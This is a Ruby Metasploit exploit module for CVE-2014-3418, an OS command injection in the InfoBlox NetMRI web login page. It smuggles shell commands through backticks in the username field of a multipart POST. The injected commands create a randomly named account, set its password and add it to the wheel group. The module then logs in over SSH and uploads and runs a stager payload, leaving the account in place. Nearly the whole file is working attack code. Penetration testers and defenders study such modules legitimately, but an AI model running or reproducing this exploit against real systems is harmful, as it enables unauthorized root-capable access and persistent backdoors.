##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::CmdStagerBourne
  include Msf::Exploit::Remote::HttpClient

  attr_accessor :ssh_socket

  def initialize
    super(
      'Name'        => 'NetMRI OS Command Injection',
      'Description' => %q{
        This module exploits a command injection vulnerability in the InfoBlox NetMRI management web interface.
	It was tested with versions 6.8.2.11, but should work with 6.4.X.X - 6.8.4.X 
	It contains code from the sshexec module by Spencer McIntyre and Brandon Knight.
	This code uses command injection to create an SSH user and set a password.
	It automatically adds you to the wheel group, so you can su.
	It then utilizes a stager to upload a base64 encoded
        binary which is then decoded, chmod'ed and executed from
        the command shell. It does not clean up after itself upon termination.
      },
      'Author'      => ['Nate Kettlewell'],
      'References'  =>
        [
          [ 'CVE', '2014-3418'] # NetMRI OS Command Injection
        ],
      'License'     => MSF_LICENSE,
      'Privileged'  => true,
      'DefaultOptions' =>
        {
          'PrependFork' => 'true',
          'EXITFUNC' => 'process'
        },
      'Payload'     =>
        {
          'Space'    => 4096,
          'BadChars' => "",
          'DisableNops' => true
        },
      'Platform'    => %w{ linux},
      'Targets'     =>
        [
          [ 'Linux x86',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'linux'
            },
          ],
        ],
      'DefaultTarget'  => 0,
      # For the CVE
      'DisclosureDate' => 'July 13 2014'
    )

    register_options(
      [
        OptString.new('USERNAME', [ false, "The user to authenticate with. If not defined will be randomly generated", '' ]),
        OptString.new('PASSWORD', [ false, "The password to authenticate with. If not defined, will be randomly generated", '' ]),
        OptString.new('RHOST', [ true, "The target address" ]),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false])
      ]
    )
  end

  def execute_command(cmd, opts = {})
    begin
      Timeout.timeout(3) do
        self.ssh_socket.exec!("#{cmd}\n")
      end
    rescue ::Exception
    end
  end

  def do_login(ip, user, pass, port)
    opt_hash = {
      :auth_methods  => ['password', 'keyboard-interactive'],
      :msframework   => framework,
      :msfmodule     => self,
      :port          => port,
      :disable_agent => true,
      :config        => false,
      :password      => pass
    }

    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

    begin
      self.ssh_socket = Net::SSH.start(ip, user, opt_hash)
    rescue Rex::ConnectionError, Rex::AddressInUse
      fail_with(Failure::Unreachable, 'Disconnected during negotiation')
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Disconnected, 'Timed out during negotiation')
    rescue Net::SSH::AuthenticationFailed
      fail_with(Failure::NoAccess, 'Failed authentication')
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
    end

    if not self.ssh_socket
      fail_with(Failure::Unknown)
    end
    return
  end

  # Create a random username and password unless it is set
  def gen_random_user_pass()
    if datastore['USERNAME'] == ''
       # Generate random username
       datastore['USERNAME'] = rand_text_alpha(8+rand(8))
    end

    if datastore['PASSWORD'] == ''
      # Generate random password
      datastore['PASSWORD'] = rand_text_alpha(8+rand(8))
    end
    return
  end  

def do_send_cmd_injection(command)

    target_uri = '/netmri/config/userAdmin/login.tdf' 

    c = connect

    # Generate Boundary
    boundary = "-----------------------------199959412518531037721276919464"
    data = "#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"_formStack\"\r\n\r\n"
    data << "netmri/config/userAdmin/login\r\n"
    data << "#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"mode\"\r\n\r\n"
    data << "DO-LOGIN\r\n"
    data << "#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"eulaAccepted\"\r\n\r\n"
    data << "Decline\r\n"
    data << "#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"TrustToken\"\r\n\r\n"
    data << " \r\n"
    data << "#{boundary}\r\n"

    data << "Content-Disposition: form-data; name=\"skipjackUsername\"\r\n\r\n"
    data << "admin`#{command}`\r\n"

    data << "#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"skipjackPassword\"\r\n\r\n"
    data << "admin\r\n"
    data << "#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"weakPassword\"\r\n\r\n"
    data << "true\r\n"
    data << "#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"x\"\r\n\r\n"
    data << "0\r\n"
    data << "#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"y\"\r\n\r\n"
    data << "0\r\n"
    data << "#{boundary}--"

    send_request_raw({
      'uri' => target_uri,
      'version' => '1.1',
      'method' => 'POST',
      'ctype'  => 'multipart/form-data; boundary=---------------------------199959412518531037721276919464',
      'data' => data,
    }, 5)

    return
  end

  def exploit

    sshport = '22'

    # Create Random SSH User + Set Password if not defined
    print_status("Generating Random Username and Password...")
    gen_random_user_pass()

    # Create the Username
    do_send_cmd_injection("useradd #{datastore['USERNAME']}")
    print_status("#{datastore['RHOST']}:#{datastore['WWWPORT']} - Creating User \"#{datastore['USERNAME']}\" with Command Injection...")

    # Set the Password
    do_send_cmd_injection("echo -e \"#{datastore['PASSWORD']}\\n#{datastore['PASSWORD']}\\n\" | passwd #{datastore['USERNAME']}")
    print_status("Setting Password for user \"#{datastore['USERNAME']}\" to \"#{datastore['PASSWORD']}\"")

    # Add to wheel group for su goodness
    print_status("Adding user \"#{datastore['USERNAME']}\" to the \"wheel\" group")
    do_send_cmd_injection("usermod -G wheel #{datastore['USERNAME']}")

    # Login via SSH
    print_status("Authenticating as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...")
    do_login(datastore['RHOST'], datastore['USERNAME'], datastore['PASSWORD'], sshport)

    print_status("#{datastore['RHOST']}:#{datastore['RPORT']} - Sending Stager...")
    execute_cmdstager({:linemax => 500})
  end
end
